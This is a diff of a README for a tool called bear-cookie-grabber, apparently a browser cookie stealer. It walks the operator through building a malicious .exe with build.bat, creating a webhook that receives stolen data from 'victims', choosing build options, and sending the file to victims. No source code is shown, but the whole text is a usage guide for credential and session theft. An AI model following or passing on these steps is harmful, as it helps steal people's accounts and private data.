@@ -25,33 +25,49 @@
 
 ## Setup
 Make sure you have [Python](https://www.python.org/downloads/) installed and it is added to your [Path](https://youtu.be/Y2q_b4ugPWk)
+
 ```sh-session
 python v3.10.1 or higher
 ```
+
 ### 1. Download The Files:
+
 ```
 Once you've downloaded the files extract the folder so it's no longer a .zip file.
 ```
-### 2. Open The bear-cookie-grabber File:
+
+### 2. Open The build.bat File:
+
 ```
-You dont need to install any modules opening this will install them for you. Then you can open the bear-cookie-grabber which will 
+You dont need to install any modules opening this will install them for you. Then you can open the build.bat which will
 open a terminal with the bear-cookie-grabber logo. Don't worry although this looks quite menacing its just aesthetic and is normal.
 ```
+
 ### 3. Create A Webhook:
+
 ```
-This webhook will be sent any victims you log so don't delete it once it's made. Once you've created one paste it 
+This webhook will be sent any victims you log so don't delete it once it's made. Once you've created one paste it
 into the terminal when prompted.
 ```
-### 4. Making bear-cookie-grabber
+
+### 4. Conifgurable Options:
+
 ```
-Name ur .exe file and click enter
+Now once you've given your file a name you can pick between some options by typing either y or n for each one. After
+having done that the file will be built and ready for usage.
 ```
-### 5. Test The Photo:
-```  
-U can add .ico photo to .exe file
+
+### 5. Test The File:
+
 ```
+You will then be promtped as to whether you want to run the file or not. I reccomend this so you
+can see if there are any issues or not.
+```
+
 ### 6. What Now?
-``` 
-GG u Baimed kid with 😈bear-cookie-grabber😈
+
+```
+The .exe file will appear in the same folder where all the other files are with the name you set it as and you can now send
+this to your victims.😈
 ```
 <hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">
